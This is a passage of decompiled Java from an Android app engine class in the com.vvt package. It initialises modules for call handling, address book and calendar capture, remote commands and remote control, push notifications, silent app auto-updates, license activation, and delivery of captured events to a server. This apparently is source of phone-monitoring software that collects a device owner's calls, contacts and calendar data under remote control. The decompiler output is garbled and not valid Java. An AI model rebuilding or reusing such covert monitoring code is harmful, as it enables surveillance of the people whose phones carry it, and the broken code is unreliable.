      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.networkinfo.a)localObject3);
      localObject2 = this.g.g;
      localObject3 = this.g.r;
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.server_address_manager.a)localObject3);
      localObject2 = this.g.g;
      localObject3 = new com/vvt/appengine/y;
      localObject4 = this.g;
      ((y)localObject3).<init>((AppEngine1)localObject4);
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.datadeliverymanager.a.d)localObject3);
      this.g.g.a((FxDeliveryMethod)localObject1);
      localObject1 = this.g.g;
      localObject2 = this.g.E;
      ((com.vvt.datadeliverymanager.b)localObject1).a((com.vvt.c.c)localObject2);
    }
    localObject1 = this.g.a;
    Object localObject7;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      AppEngine1 localh1 = this.g;
      localObject1 = new com/vvt/activation_manager/ActivationManager;
      localObject2 = this.g.g;
      localObject3 = this.g.r;
      localObject4 = this.g.k;
      localObject5 = this.g.o;
      localObject6 = this.g.l;
      localObject7 = this.g.n;
      ((ActivationManager)localObject1).<init>((com.vvt.datadeliverymanager.b)localObject2, (com.vvt.server_address_manager.a)localObject3, (com.vvt.license.a)localObject4, (com.vvt.productinfo.a)localObject5, (com.vvt.phoneinfo.a)localObject6, (com.vvt.preference.b)localObject7);
      localh1.a = ((ActivationManager)localObject1);
    }
    bool1 = c;
    if (bool1) {}
    this.g.g.a();
    localObject1 = this.g.j;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/eventrepository/c;
      localObject3 = this.l;
      ((com.vvt.eventrepository.c)localObject2).<init>((String)localObject3);
      ((AppEngine1)localObject1).j = ((com.vvt.eventrepository.c)localObject2);
      localObject1 = this.g.j;
      localObject2 = new com/vvt/eventrepository/querycriteria/a;
      ((com.vvt.eventrepository.querycriteria.a)localObject2).<init>();
      ((com.vvt.eventrepository.c)localObject1).a((com.vvt.eventrepository.querycriteria.a)localObject2);
      localObject1 = this.g.j;
      localObject2 = l();
      ((com.vvt.eventrepository.c)localObject1).a((com.vvt.eventrepository.e)localObject2);
      localObject1 = this.g.j;
      localObject2 = this.g.a();
      ((com.vvt.eventrepository.c)localObject1).a((Context)localObject2);
    }
    localObject1 = this.g.i;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/eventdelivery/f;
      localObject3 = this.l;
      localObject4 = this.g.g;
      localObject5 = this.g.j;
      ((com.vvt.eventdelivery.f)localObject2).<init>((String)localObject3, (com.vvt.datadeliverymanager.b)localObject4, (com.vvt.eventrepository.b)localObject5);
      ((AppEngine1)localObject1).i = ((com.vvt.eventdelivery.f)localObject2);
    }
    localObject1 = this.g.h;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/appengine/q;
      localObject3 = this.g.j;
      localObject4 = this.g.i;
      localObject5 = this.g.k;
      ((q)localObject2).<init>((com.vvt.eventrepository.c)localObject3, (EventDelivery)localObject4, (com.vvt.license.a)localObject5);
      ((AppEngine1)localObject1).h = ((q)localObject2);
      localObject1 = this.g.E;
      localObject2 = this.g.h;
      ((com.vvt.c.c)localObject1).a((com.vvt.base.a)localObject2);
    }
    localObject1 = this.g.q;
    if (localObject1 == null)
    {
      bool1 = b;
      if (bool1) {}
      localObject1 = this.g;
      localObject2 = new com/vvt/remotecontrol/RemoteControlImpl;
      ((RemoteControlImpl)localObject2).<init>();
      ((AppEngine1)localObject1).q = ((RemoteControlImpl)localObject2);
    }
    localObject1 = this.g.p;
    if (localObject1 == null)
    {
      bool1 = b;
      if (bool1) {}
      localObject1 = this.g;
      localObject2 = new com/vvt/remotecommand/b;
      localObject3 = this.l;
      ((com.vvt.remotecommand.b)localObject2).<init>((String)localObject3);
      ((AppEngine1)localObject1).p = ((com.vvt.remotecommand.b)localObject2);
      localObject1 = this.g.p;
      localObject2 = this.g.c;
      ((com.vvt.remotecommand.b)localObject1).a((com.vvt.ae.f)localObject2);
      localObject1 = this.g.p;
      localObject2 = this.g.h;
      ((com.vvt.remotecommand.b)localObject1).a((com.vvt.base.a)localObject2);
      localObject1 = this.g.p;
      localObject2 = this.g.k;
      ((com.vvt.remotecommand.b)localObject1).a((com.vvt.license.a)localObject2);
      localObject1 = this.g.p;
      int i1 = this.g.o.getProductId();
      localObject2 = String.valueOf(i1);
      localObject3 = this.g.o.getProductVersion();
      ((com.vvt.remotecommand.b)localObject1).a((String)localObject2, (String)localObject3);
    }
    localObject1 = this.g.c;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      localObject1 = this.g;
      localObject2 = new com/vvt/ae/f;
      localObject3 = this.g.d();
      localObject4 = this.g.a();
      ((com.vvt.ae.f)localObject2).<init>((RunningMode)localObject3, (Context)localObject4);
      ((AppEngine1)localObject1).c = ((com.vvt.ae.f)localObject2);
    }
    localObject1 = this.g.Q;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      localObject7 = this.g;
      localObject1 = new com/vvt/callhandler/c;
      localObject2 = this.g.d();
      localObject3 = this.g.a();
      localObject4 = this.g.b();
      localObject5 = this.g.n;
      localObject6 = this.g.h;
      ((com.vvt.callhandler.c)localObject1).<init>((RunningMode)localObject2, (Context)localObject3, (String)localObject4, (com.vvt.preference.b)localObject5, (com.vvt.base.a)localObject6);
      ((AppEngine1)localObject7).Q = ((com.vvt.callhandler.c)localObject1);
      localObject1 = this.g.Q;
      localObject2 = this.g.c;
      ((com.vvt.callhandler.c)localObject1).a((com.vvt.ae.f)localObject2);
      localObject1 = this.g.Q;
      ((com.vvt.callhandler.c)localObject1).b();
    }
    localObject1 = this.g.a();
    boolean bool3 = com.vvt.aa.b.a((Context)localObject1);
    bool1 = c;
    if (bool1) {}
    localObject1 = this.g.b;
    if ((localObject1 == null) && (bool3))
    {
      bool1 = c;
      if (bool1) {}
      localObject1 = this.g;
      localObject2 = new com/vvt/callmanager/ref/e;
      localObject3 = this.g.d();
      localObject4 = new com/vvt/appengine/p;
      localObject5 = this.g;
      ((p)localObject4).<init>((AppEngine1)localObject5);
      ((com.vvt.callmanager.ref.e)localObject2).<init>((RunningMode)localObject3, (com.vvt.base.communication.a)localObject4);
      ((AppEngine1)localObject1).b = ((com.vvt.callmanager.ref.e)localObject2);
    }
    localObject1 = this.g.H;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/v/c;
      localObject3 = this.g.b();
      localObject4 = this.h.getContentResolver();
      localObject5 = this.g.h;
      localObject6 = this.g.d();
      ((com.vvt.v.c)localObject2).<init>((String)localObject3, (ContentResolver)localObject4, (com.vvt.base.a)localObject5, (RunningMode)localObject6);
      ((AppEngine1)localObject1).H = ((com.vvt.v.c)localObject2);
    }
    localObject1 = this.g.M;
    if (localObject1 == null)
    {
      localObject7 = this.g;
      localObject1 = new com/vvt/application_profile_manager/ApplicationProfileManagerImpl;
      localObject2 = this.g.b();
      localObject3 = this.g.d();
      localObject4 = this.g.a();
      localObject5 = this.g.h;
      localObject6 = this.g.g;
      ((ApplicationProfileManagerImpl)localObject1).<init>((String)localObject2, (RunningMode)localObject3, (Context)localObject4, (com.vvt.base.a)localObject5, (com.vvt.datadeliverymanager.b)localObject6);
      ((AppEngine1)localObject7).M = ((ApplicationProfileManagerImpl)localObject1);
      localObject1 = this.g.M;
      ((ApplicationProfileManagerImpl)localObject1).a();
    }
    localObject1 = this.g.C;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/addressbookmanager/b;
      localObject3 = this.g.b();
      localObject4 = this.g.n;
      localObject5 = this.g.d();
      localObject6 = this.g.a();
      ((com.vvt.addressbookmanager.b)localObject2).<init>((String)localObject3, (com.vvt.preference.b)localObject4, (RunningMode)localObject5, (Context)localObject6);
      ((AppEngine1)localObject1).C = ((com.vvt.addressbookmanager.b)localObject2);
      localObject1 = this.g.C;
      localObject2 = this.g.g;
      ((com.vvt.addressbookmanager.b)localObject1).a((com.vvt.datadeliverymanager.b)localObject2);
      localObject1 = this.g.C;
      ((com.vvt.addressbookmanager.b)localObject1).a();
    }
    localObject1 = this.g.N;
    if (localObject1 == null)
    {
      localObject1 = this.h.getContentResolver();
      localObject2 = this.g;
      localObject3 = new com/vvt/capture/calendar/a;
      localObject4 = this.g.d();
      localObject5 = this.g.g;
      localObject6 = this.l;
      ((com.vvt.capture.calendar.a)localObject3).<init>((RunningMode)localObject4, (ContentResolver)localObject1, (com.vvt.datadeliverymanager.b)localObject5, (String)localObject6);
      ((AppEngine1)localObject2).N = ((com.vvt.capture.calendar.a)localObject3);
    }
    localObject1 = this.g.V;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/n/a/c;
      localObject3 = this.g.b();
      localObject4 = this.g.a();
      localObject5 = this.g.c();
      ((com.vvt.n.a.c)localObject2).<init>((String)localObject3, (Context)localObject4, (String)localObject5);
      ((AppEngine1)localObject1).V = ((com.vvt.n.a.c)localObject2);
    }
    localObject1 = this.g.Z;
    if (localObject1 == null)
    {
      localObject1 = this.g;
      localObject2 = new com/vvt/autoupdate/a;
      localObject3 = this.g.b();
      localObject4 = this.h;
      localObject5 = this.m;
      localObject6 = this.g.h;
      ((com.vvt.autoupdate.a)localObject2).<init>((String)localObject3, (Context)localObject4, (RunningMode)localObject5, (com.vvt.base.a)localObject6);
      ((AppEngine1)localObject1).Z = ((com.vvt.autoupdate.a)localObject2);
      localObject1 = this.g.Z;
      localObject2 = this.g.g;
      ((com.vvt.autoupdate.a)localObject1).a((com.vvt.datadeliverymanager.b)localObject2);
      this.g.Z.a();
      localObject1 = this.g.Z;
      ((com.vvt.autoupdate.a)localObject1).b();
    }
    localObject1 = this.g.ak;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      localObject1 = this.g;
      localObject2 = new com/vvt/playstore/autoupdateapps/b;
      localObject3 = this.g.b();
      localObject4 = this.h;
      localObject5 = this.g.d();
      localObject6 = this.g.c();
      ((com.vvt.playstore.autoupdateapps.b)localObject2).<init>((String)localObject3, (Context)localObject4, (RunningMode)localObject5, (String)localObject6);
      ((AppEngine1)localObject1).ak = ((com.vvt.playstore.autoupdateapps.b)localObject2);
      localObject1 = this.g.ak;
      ((com.vvt.playstore.autoupdateapps.b)localObject1).b();
    }
    localObject1 = this.g.s;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      AppEngine1 localh2 = this.g;
      localObject1 = new com/vvt/pushnotification/d;
      localObject2 = this.g.h;
      localObject3 = this.g.p;
      localObject4 = this.m;
      localObject5 = this.g.l;
      localObject6 = this.l;
      localObject7 = this.g.a();
      ((com.vvt.pushnotification.d)localObject1).<init>((com.vvt.base.a)localObject2, (com.vvt.remotecommand.b)localObject3, (RunningMode)localObject4, (com.vvt.phoneinfo.a)localObject5, (String)localObject6, (Context)localObject7);
      localh2.s = ((com.vvt.pushnotification.d)localObject1);
      localObject1 = this.g.s;
      ((com.vvt.pushnotification.d)localObject1).a();
    }
    localObject1 = this.g.al;
    if (localObject1 == null)
    {
      bool1 = c;
      if (bool1) {}
      localObject1 = this.g;
      localObject2 = new com/vvt/temporalcontrol/d;
      localObject3 = this.h;
      localObject4 = this.l;
      localObject5 = this.m;
      ((com.vvt.temporalcontrol.d)localObject2).<init>((Context)localObject3, (String)localObject4, (RunningMode)localObject5);
      ((AppEngine1)localObject1).al = ((com.vvt.temporalcontrol.d)localObject2);
    }
    bool1 = b;
    if (bool1) {}
    localObject1 = this.g;
    i.a((AppEngine1)localObject1);
    if (bool3)
    {
      bool1 = b;
      if (bool1) {}
      localObject1 = this.g.b;
      ((com.vvt.callmanager.ref.e)localObject1).b();
      bool1 = b;
      if (bool1) {}
      localObject1 = this.g.b;
      ((com.vvt.callmanager.ref.e)localObject1).c();
    }
    bool1 = b;
    if (bool1) {}
  }
  
  public void e()
  {
    bool1 = true;
    boolean bool2 = b;
    if (bool2) {}
    Object localObject1 = this.g.k.a();
    Object localObject2 = ((LicenseInfo)localObject1).getLicenseStatus();
    LicenseStatus localLicenseStatus = LicenseStatus.ACTIVATED;
    boolean bool3;
    if (localObject2 == localLicenseStatus)
    {
      ((LicenseInfo)localObject1).getActivationCode();
      bool3 = c;
      if (!bool3) {}
    }
    for (;;)
    {
      try
      {
        bool3 = b;
        if (bool3) {}
        localObject2 = this.g;
        i.a((AppEngine1)localObject2);
        if (!bool1) {
          continue;
        }
        bool1 = c;
        if (bool1) {}
        n();
        bool1 = c;
        if (bool1) {}
        o();
        localObject3 = this.g;
        localObject3 = ((AppEngine1)localObject3).ak;
        if (localObject3 != null)
        {
          localObject3 = this.g;
          localObject3 = ((AppEngine1)localObject3).ak;
          bool2 = true;
          ((com.vvt.playstore.autoupdateapps.b)localObject3).a(bool2);
        }
      }
      finally
      {
        Object localObject3;
        bool1 = e;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = b;
      if (bool1) {}
      return;
      bool1 = false;
      localObject3 = null;
      break;
      localObject3 = ((LicenseInfo)localObject1).getLicenseStatus();
      localObject1 = LicenseStatus.NOT_ACTIVATED;
      if (localObject3 == localObject1)
      {
        bool1 = c;
        if (bool1) {}
        localObject3 = this.g;
        localObject3 = ((AppEngine1)localObject3).n;
        ((com.vvt.preference.b)localObject3).c();
        bool1 = c;
        if (bool1) {}
        localObject3 = this.g;
        localObject3 = ((AppEngine1)localObject3).j;
        ((com.vvt.eventrepository.c)localObject3).c();
        bool1 = c;
        if (bool1) {}
        localObject3 = this.g;
        localObject3 = ((AppEngine1)localObject3).C;
        ((com.vvt.addressbookmanager.b)localObject3).j();
      }
    }
  }
  
  public void f()
  {
    boolean bool1 = true;
    boolean bool2 = c;
    if (bool2) {}
    Object localObject1 = this.g.g;
    if (localObject1 != null)
    {
      localObject1 = new com/vvt/datadeliverymanager/h;
      ((com.vvt.datadeliverymanager.h)localObject1).<init>();
      ((com.vvt.datadeliverymanager.h)localObject1).a(38);
      Object localObject2 = new com/vvt/phoenix/prot/command/l;
      ((com.vvt.phoenix.prot.command.l)localObject2).<init>();
      ((com.vvt.datadeliverymanager.h)localObject1).a((com.vvt.phoenix.prot.command.b)localObject2);
      localObject2 = this.a;
      ((com.vvt.datadeliverymanager.h)localObject1).a((com.vvt.datadeliverymanager.a.a)localObject2);
      localObject2 = DeliveryRequestType.REQUEST_TYPE_NEW;
      ((com.vvt.datadeliverymanager.h)localObject1).a((DeliveryRequestType)localObject2);
      localObject2 = PriorityRequest.PRIORITY_NORMAL;
      ((com.vvt.datadeliverymanager.h)localObject1).a((PriorityRequest)localObject2);
      localObject2 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
      ((com.vvt.datadeliverymanager.h)localObject1).a((DataProviderType)localObject2);
      int i1 = 20;
      ((com.vvt.datadeliverymanager.h)localObject1).c(i1);
      long l1 = 180000L;
      ((com.vvt.datadeliverymanager.h)localObject1).b(l1);
      ((com.vvt.datadeliverymanager.h)localObject1).c(bool1);
      ((com.vvt.datadeliverymanager.h)localObject1).b(bool1);
      localObject2 = this.g.g;
      ((com.vvt.datadeliverymanager.b)localObject2).a((com.vvt.datadeliverymanager.h)localObject1);
      bool2 = c;
      if (!bool2) {}
    }
    bool2 = c;
    if (bool2) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */